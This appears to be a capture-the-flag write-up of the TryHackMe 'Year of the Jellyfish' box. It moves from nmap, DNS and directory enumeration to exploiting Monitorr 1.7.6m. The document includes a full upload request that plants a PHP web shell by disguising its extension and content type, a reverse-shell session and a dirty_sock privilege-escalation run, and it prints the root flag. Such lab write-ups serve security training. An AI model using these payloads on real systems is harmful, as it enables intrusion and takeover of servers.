@@ -1,0 +1,464 @@
+Year Of The JellyFish
+
+NMAP RESULTS:
+=================================================
+
+Nmap scan report for robyns-petshop.thm (34.243.205.128)
+Host is up, received reset ttl 255 (0.025s latency).
+Scanned at 2021-04-24 01:49:07 EDT for 56s
+
+PORT     STATE    SERVICE       REASON         VERSION
+21/tcp   open     ftp           syn-ack ttl 64 vsftpd 3.0.3
+22/tcp   open     ssh           syn-ack ttl 64 OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 46:b2:81:be:e0:bc:a7:86:39:39:82:5b:bf:e5:65:58 (RSA)
+|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3op12UwFIehC/VLx5tzBbmCUO/IzJlyueCj1/qP7tq3DcrBu9iQbC1gYemElU2FhqHH2KQr9MFrWRJgU4dH0iQOFld1WU9BNjfr6VcLOI+flLQstwWf1mJXEOdDjA98Cx+blYWG62qwXLiW+aq2jLfIZkVjJlp7OueNeocxE0P7ynTqJIadMfeNqNZ1Jc+s7aCBSg0NRSh0FsABAG+BSFhybnKXtApc+RG0QQ3vFpnU0k0PVZvg/qU/Eb6Oimm67d8hjclPbPpQoyvsdyOQG7yVS9eIglTr00ddw2Jn8wrapOa4TcBJGu9cgSgITHR8+htJ1LLj3EtsmJ0pErEv0B
+53/tcp   open     tcpwrapped    syn-ack ttl 64
+80/tcp   open     http          syn-ack ttl 64 Apache httpd 2.4.29
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Did not follow redirect to https://robyns-petshop.thm/
+443/tcp  open     ssl/http      syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Robyn&#039;s Pet Shop
+| ssl-cert: Subject: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB/localityName=Bristol/emailAddress=robyn@robyns-petshop.thm
+| Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm
+| Issuer: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB/localityName=Bristol/emailAddress=robyn@robyns-petshop.thm
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-04-24T05:03:46
+| Not valid after:  2022-04-24T05:03:46
+| MD5:   f3c9 40ec 34e3 1212 10ad aeb7 38a7 1128
+| SHA-1: 126f c903 f7ae 993d c12a ca33 8b4e 1c41 367d ee46
+| -----BEGIN CERTIFICATE-----
+| MIIEPzCCAyegAwIBAgIUS8OZXY5b1bFm6YwHXXlRSUtYKAkwDQYJKoZIhvcNAQEL
+| BQAwgZMxCzAJBgNVBAYTAkdCMRMwEQYDVQQIDApTb3V0aCBXZXN0MRAwDgYDVQQH
+| DAdCcmlzdG9sMRcwFQYDVQQKDA5Sb2J5bnMgUGV0c2hvcDEbMBkGA1UEAwwScm9i
+| eW5zLXBldHNob3AudGhtMScwJQYJKoZIhvcNAQkBFhhyb2J5bkByb2J5bnMtcGV0
+| c2hvcC50aG0wHhcNMjEwNDI0MDUwMzQ2WhcNMjIwNDI0MDUwMzQ2WjCBkzELMAkG
+| A1UEBhMCR0IxEzARBgNVBAgMClNvdXRoIFdlc3QxEDAOBgNVBAcMB0JyaXN0b2wx
+| FzAVBgNVBAoMDlJvYnlucyBQZXRzaG9wMRswGQYDVQQDDBJyb2J5bnMtcGV0c2hv
+| cC50aG0xJzAlBgkqhkiG9w0BCQEWGHJvYnluQHJvYnlucy1wZXRzaG9wLnRobTCC
+| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAJuoypxdXyuJdCET+xuvNmSU
+| Vef9lTJ4jQH9Z2q4IrkZZVSJDLdcB/xUMVz4PKPWjaT0Ub2fGMziyzjBOFW0AhlV
+| CKh6zOaIPV8oEb+Vi1Zf/OsV896h2IquMBalUZeW6hrSbfA30QEdSUDmujZcY1GY
+| UKXJziFvyXSllpAJ4fwPmYq64ynRQX/7ID+11P9kAq03evMdRoZVkzJ8rZ9aMUqb
+| VKIQqbWDU9/i3FZIoZmJqrZcE0RaC/0gxCREQhpqzOmwfk+/6tgUNcbBo9SQwbot
+| p7YVba0P9JDBvNQicBbFIH8l4To8Jo6SGBB2niMEh84PNlyr9lJT5fZpczjOfpUC
+| AwEAAaOBiDCBhTAJBgNVHRMEAjAAMAsGA1UdDwQEAwIF4DBrBgNVHREEZDBighJy
+| b2J5bnMtcGV0c2hvcC50aG2CG21vbml0b3JyLnJvYnlucy1wZXRzaG9wLnRobYIX
+| YmV0YS5yb2J5bnMtcGV0c2hvcC50aG2CFmRldi5yb2J5bnMtcGV0c2hvcC50aG0w
+| DQYJKoZIhvcNAQELBQADggEBAGjcTNoHDGcQAldZN+gDVPoNQLGIWTXQS2MvEiSY
+| pKxN78Rkl6nApwTPfbtTxV+Zl8+i0XXZLidkdkM3yN1IaLgXqdAASV3TBNyuxpMM
+| 0sHRjTbHVgeVc7TU1qTl7K1Zy4atzbtY1i2G7GH3rngLFArTS0IriM+lv17XG1LB
+| YbeFoATkXM9eqmUx4QD44JBC+SQ23tk0KARA+WZawGa2xuhH+QuV6ngK9TM7mCrC
+| 52M50v+t4ft0S6JMBcAthuTEgvBLa7orkAkCI0Ul0+AXSkc6VnOgO0gL83ZrzVih
+| Le1Ppn+bBYwmO6pn9XflGIuQzoL05DqcMf3uVfLI3GWOOiA=
+|_-----END CERTIFICATE-----
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+1306/tcp filtered re-conn-proto no-response
+8000/tcp open     http-alt      syn-ack ttl 64
+| fingerprint-strings: 
+|   GenericLines: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Length: 15
+|_    Request
+| http-methods: 
+|_  Supported Methods: HEAD POST OPTIONS
+|_http-trane-info: Problem with XML parsing of /evox/about
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8000-TCP:V=7.91%I=7%D=4/24%Time=6083B160%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,3F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x2
+SF:015\r\n\r\n400\x20Bad\x20Request");
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: bridge
+Running: Oracle Virtualbox
+OS CPE: cpe:/o:oracle:virtualbox
+OS details: Oracle Virtualbox
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=4/24%OT=21%CT=%CU=%PV=N%DS=2%DC=T%G=N%TM=6083B18B%P=x8
+OS:6_64-pc-linux-gnu)SEQ(SP=11%GCD=FA00%ISR=9C%TI=I%CI=I%TS=U)OPS(O1=M5B4%O
+OS:2=M5B4%O3=M5B4%O4=M5B4%O5=M5B4%O6=M5B4)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FF
+OS:FF%W5=FFFF%W6=FFFF)ECN(R=Y%DF=N%TG=40%W=FFFF%O=M5B4%CC=N%Q=)T1(R=Y%DF=N%
+OS:TG=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=N%TG=FF%W=0%S=Z%A=S%F=AR%O=%RD=0%Q
+OS:=)T3(R=Y%DF=N%TG=FF%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T4(R=Y%DF=N%TG=FF%W=0%S
+OS:=A%A=Z%F=R%O=%RD=0%Q=)T6(R=Y%DF=N%TG=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=
+OS:Y%DF=N%TG=FF%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)U1(R=N)IE(R=N)
+
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=17 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   0.53 ms 10.0.2.2
+2   0.53 ms robyns-petshop.thm (34.243.205.128)
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 01:50
+Completed NSE at 01:50, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 01:50
+Completed NSE at 01:50, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 01:50
+Completed NSE at 01:50, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 62.20 seconds
+           Raw packets sent: 50 (4.464KB) | Rcvd: 30 (1.272KB)
+
+
+
+
+DNS ENUMERATION:
+===========================================
+
+┌──(root💀kali)-[~]
+└─# dig 34.243.205.128
+
+; <<>> DiG 9.16.11-Debian <<>> 34.243.205.128
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 27883
+;; flags: qr rd ra ad; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 512
+;; QUESTION SECTION:
+;34.243.205.128.                        IN      A
+
+;; AUTHORITY SECTION:
+.                       86393   IN      SOA     a.root-servers.net. nstld.verisign-grs.com. 2021042302 1800 900 604800 86400
+
+;; Query time: 0 msec
+;; SERVER: 192.168.1.1#53(192.168.1.1)
+;; WHEN: Sat Apr 24 01:11:15 EDT 2021
+;; MSG SIZE  rcvd: 118
+
+                                                                                                                                                                        
+┌──(root💀kali)-[~]
+└─# dig axfr @34.243.205.128
+
+; <<>> DiG 9.16.11-Debian <<>> axfr @34.243.205.128
+; (1 server found)
+;; global options: +cmd
+.                       86218   IN      NS      a.root-servers.net.
+.                       86218   IN      NS      b.root-servers.net.
+.                       86218   IN      NS      c.root-servers.net.
+.                       86218   IN      NS      d.root-servers.net.
+.                       86218   IN      NS      e.root-servers.net.
+.                       86218   IN      NS      f.root-servers.net.
+.                       86218   IN      NS      g.root-servers.net.
+.                       86218   IN      NS      h.root-servers.net.
+.                       86218   IN      NS      i.root-servers.net.
+.                       86218   IN      NS      j.root-servers.net.
+.                       86218   IN      NS      k.root-servers.net.
+.                       86218   IN      NS      l.root-servers.net.
+.                       86218   IN      NS      m.root-servers.net.
+;; Query time: 8 msec
+;; SERVER: 34.243.205.128#53(34.243.205.128)
+;; WHEN: Sat Apr 24 01:11:38 EDT 2021
+;; MSG SIZE  rcvd: 239
+
+                                                                                                                                                                        
+┌──(root💀kali)-[~]
+└─# nslookup                                                  
+> server 34.243.205.128
+Default server: 34.243.205.128
+Address: 34.243.205.128#53
+> localhost
+Server:         34.243.205.128
+Address:        34.243.205.128#53
+
+** server can't find localhost: NXDOMAIN
+> 34.243.205.128
+128.205.243.34.in-addr.arpa     name = ec2-34-243-205-128.eu-west-1.compute.amazonaws.com.
+
+Authoritative answers can be found from:
+> robyns-petshop.thm
+Server:         34.243.205.128
+Address:        34.243.205.128#53
+
+** server can't find robyns-petshop.thm: NXDOMAIN
+>                                                                                                                                                                         
+┌──(root💀kali)-[~]
+└─# dig axfr @robyns-petshop.thm                                                                                                                                    1 ⨯
+
+; <<>> DiG 9.16.11-Debian <<>> axfr @robyns-petshop.thm
+; (1 server found)
+;; global options: +cmd
+.                       86425   IN      NS      m.root-servers.net.
+.                       86425   IN      NS      b.root-servers.net.
+.                       86425   IN      NS      c.root-servers.net.
+.                       86425   IN      NS      d.root-servers.net.
+.                       86425   IN      NS      e.root-servers.net.
+.                       86425   IN      NS      f.root-servers.net.
+.                       86425   IN      NS      g.root-servers.net.
+.                       86425   IN      NS      h.root-servers.net.
+.                       86425   IN      NS      a.root-servers.net.
+.                       86425   IN      NS      i.root-servers.net.
+.                       86425   IN      NS      j.root-servers.net.
+.                       86425   IN      NS      k.root-servers.net.
+.                       86425   IN      NS      l.root-servers.net.
+;; Query time: 4 msec
+;; SERVER: 34.243.205.128#53(34.243.205.128)
+;; WHEN: Sat Apr 24 01:13:05 EDT 2021
+;; MSG SIZE  rcvd: 239
+
+
+SOME SUBDOMAINS:
+================================
+monitorr.robyns-petshop.thm
+beta.robyns-petshop.thm
+dev.robyns-petshop.thm
+
+
+GOBUSTER SCANS:(robyns-petshop.thm)
+===========================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/assets (Status: 301)
+/business (Status: 401)
+/config (Status: 301)
+/content (Status: 301)
+/index.php (Status: 200)
+/LICENSE (Status: 200)
+/plugins (Status: 301)
+/server-status (Status: 403)
+/themes (Status: 301)
+/vendor (Status: 301)
+
+
+
+Pico is a stupidly simple, blazing fast, flat file CMS. See http://picocms.org/ for more info.
+
+`PicoDeprecated`'s purpose is to maintain backward compatibility to older versions of Pico, by re-introducing characteristics that were removed from Pico's core. It for example triggers old events (like the `before_render` event used before Pico 1.0) and reads config files that were written in PHP (`config/config.php`, used before Pico 2.0).
+
+Please refer to [`picocms/Pico`](https://github.com/picocms/Pico) to get info about how to contribute or getting help.
+
+
+INFO:
+==================
+{
+    "name": "picocms/pico-deprecated",
+    "type": "pico-plugin",
+    "description": "This is Pico's official PicoDeprecated plugin. Pico is a stupidly simple, blazing fast, flat file CMS.",
+    "keywords": [ "pico", "picocms", "picocms-plugin", "pico-deprecated", "compatibility", "deprecation" ],
+    "homepage": "http://picocms.org/",
+    "license": "MIT",
+    "authors": [
+        {
+            "name": "Daniel Rudolf",
+            "email": "picocms.org@daniel-rudolf.de",
+            "role": "Lead Developer"
+        },
+        {
+            "name": "The Pico Community",
+            "homepage": "http://picocms.org/"
+        },
+        {
+            "name": "Contributors",
+            "homepage": "https://github.com/picocms/pico-deprecated/graphs/contributors"
+        }
+    ],
+    "support": {
+        "docs": "http://picocms.org/plugins/deprecated/",
+        "issues": "https://github.com/picocms/pico-deprecated/issues",
+        "source": "https://github.com/picocms/pico-deprecated"
+    },
+    "require": {
+        "php": ">=5.3.0",
+        "picocms/pico": "self.version"
+    },
+    "autoload": {
+        "classmap": [ "PicoDeprecated.php", "lib/", "plugins/" ]
+    },
+    "extra": {
+        "branch-alias": {
+            "dev-master": "2.1.x-dev",
+            "dev-pico-3.0": "3.0.x-dev"
+        }
+    }
+}
+
+
+CHECKING CHANGELOGS:
+==============================
+### Version 2.1.4
+Released: 2020-08-29
+
+No changes
+
+
+BUT CAN'T FIND ANY VULNERABILITY:
+
+BUT WE HAVE OTHER DOMAINS ALSO, LETS ENUMERATE THEM ALSO:
+===============================
+
+I ENUMERATE THE 'monitorr.robyns-petshop.thm' DOMAIN AND FOUND AN SOFTWARE NAMED 'Monitorr 1.7.6m'
+I SEARCH ON SEARCHSPLOIT FOR ANY EXPLOITS FOR THIS VERSION,AND I FOUND SOME EXPLOITS:
+================================
+
+# searchsploit monitorr
+-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Monitorr 1.7.6m - Authorization Bypass                     | php/webapps/48981.py
+Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)        | php/webapps/48980.py
+-------------------------------------------------------------------------------------------------------------------------------------- 
+
+
+LETS TRY THESE EXPLOITS:
+AS WE DON"T HAVE CREDENTIALS WE MUST USE THE SECOND EXPLOIT
+BUT THESE EXPLOIT WONT WORK AS THE SSL CERTIFICATE
+
+SO WE HAVE TO DO THIS EXPLOIT MANUALLY:
+
+SO FIRST I INTERCEPT THE REQUEST AT BURP:
+=============================================
+GET / HTTP/1.1
+Host: monitorr.robyns-petshop.thm
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: isHuman=1; PHPSESSID=2u0abrs6ug4lembndc4clnku94
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+===============================================
+
+WE CAN SEE THE COOKIE NAME 'isHuman' WHICH IS SET TO 1
+
+I READ THE POC OF THIS EXPLOIT AND FOUND AN 'assets' DIRECTORY, IN WHICH I CAN REGISTER MY SELF AND THEN LOGIN TO ACCESS THE SERVICE 
+CONFIGURATION FILE ON THE MAIN PAGE (settings.php)
+
+FIRST I CREATE AN ACCOUNT THEN LOGGED IN, THEN NAVIGATE TO THE /settings.php THEN SERVICE CONFIGURATION TAB
+NOW WE CAN UPLOAD AN IMAGE, AND CHECK HOW TO BYPASS SO THAT WE CAN UPLOAD OUR REVERSE SHELL
+
+I CLICK ON 'IMAGE' OPTION, THEN SELECT AN .png FILE WHICH UPLOADS SUCCESSFULLY
+BUT WHEN I UPLOAD .php OR .png.php FILE IT CAUGHT IT AND BLOCK OUR REQUEST
+
+IN BURP,
+I USE THIS REQUEST:
+============================
+POST /assets/php/upload.php HTTP/1.1
+Host: monitorr.robyns-petshop.thm
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/plain, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------351401031524829606173245870032
+Content-Length: 278
+Origin: https://monitorr.robyns-petshop.thm
+Connection: close
+Referer: https://monitorr.robyns-petshop.thm/assets/php/monitorr-services_settings.php
+Cookie: isHuman=1; PHPSESSID=2u0abrs6ug4lembndc4clnku94
+
+-----------------------------351401031524829606173245870032
+Content-Disposition: form-data; name="fileToUpload"; filename="shell.png.phtml"
+Content-Type: application/png
+
+GIF8a;
+<?php system($_GET['cmd']); ?>
+
+-----------------------------351401031524829606173245870032--
+
+I CHANGE THE 'Content-Type' AS png AND THE FILE EXTENSION AS '.png.phtml'
+
+RESPONSE:
+====================
+<div id='uploadreturn'>File shell.png.phtml is an image: <br><div id='uploadok'>File shell.png.phtml has been uploaded to: ../data/usrimg/shell.png.phtml</div></div>
+
+
+LETS NAVIGATE TO THIS DIRECTORY WHICH IS IN THE /assets DIRECTORY:
+======================
+
+I MADE A GET REQUEST:
+https://monitorr.robyns-petshop.thm/assets/data/usrimg/shell.png.phtml?cmd=ls
+
+GOT THE RCE!!!:
+GIF8a; shell.png shell.png.phtml usrimg.png 
+
+YES!!, NOW USE BURPSUIT TO GET THE REVERSE SHELL
+
+I UPLOAD MY REVERSE SHELL IN PHP ON THE SERVER USING THE BURP REQUEST
+THEN EXECUTE IT TO GET A REVERSE SHELL:
+
+# nc -nvlp 443                                                                 1 ⨯
+listening on [any] 443 ...
+connect to [10.8.73.218] from (UNKNOWN) [10.10.71.27] 55198
+bash: cannot set terminal process group (983): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@petshop:/var/www/monitorr/assets/data/usrimg$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@petshop:/var/www/monitorr/assets/data/usrimg$ 
+
+
+GOT THE USER FLAG
+
+NOW RUNNING LINPEAS, FOUND NOTHING IMPORTANT
+RUNNING LINUX-EXPLOIT-SUGGESTER:
+=================================================================
+Available information:
+
+Kernel version: 4.15.0
+[+] [CVE-2018-18955] subuid_shell
+
+   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
+   Exposure: probable
+   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
+   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
+   Comments: CONFIG_USER_NS needs to be enabled
+
+[+] [CVE-2019-7304] dirty_sock
+
+   Details: https://initblog.com/2019/dirty-sock/
+   Exposure: less probable
+   Tags: ubuntu=18.10,mint=19
+   Download URL: https://github.com/initstring/dirty_sock/archive/master.zip
+   Comments: Distros use own versioning scheme. Manual verification needed.
+
+=================================================================
+
+MAYBE THIS SECOND ONE CAN WORK AS THIS IS THE LATEST ONE
+
+I DOWNLOAD THE SCRIPT THEN EXTRACT IT USING UNZIP
+AFTER READING README.md FILE, WE HAVE TO RUN THE PYTHON SCRIPT WITHOUT ARGUMENTS
+============================================================
+www-data@petshop:/tmp/dirty_sock-master$ python3 dirty_sockv2.py
+[...]
+[+] Slipped dirty sock on random socket file: /tmp/pfmjhaxpiy;uid=0;
+[+] Binding to socket file...
+[+] Connecting to snapd API...
+[+] Deleting trojan snap (and sleeping 5 seconds)...
+[+] Installing the trojan snap (and sleeping 8 seconds)...
+[+] Deleting trojan snap (and sleeping 5 seconds)...
+
+********************
+Success! You can now `su` to the following account and use sudo:
+   username: dirty_sock
+   password: dirty_sock
+********************
+
+www-data@petshop:/tmp/dirty_sock-master$ su dirty_sock
+Password: dirty_sock
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+dirty_sock@petshop:/tmp/dirty_sock-master$ sudo cat /root/root.txt
+THM{ZWM5N2ViY2QxNjE4MjkxOWRiYWQ4NjUx}
+
+GOT THE ROOT FLAG
+
+(WHEN I RUN THE SCRIPT FOR THE FIRST TIME IT SAYS UNAUTHORIZED BUT THE EXPLOIT HAS ALREADY APPLIED TO THE KERNEL)
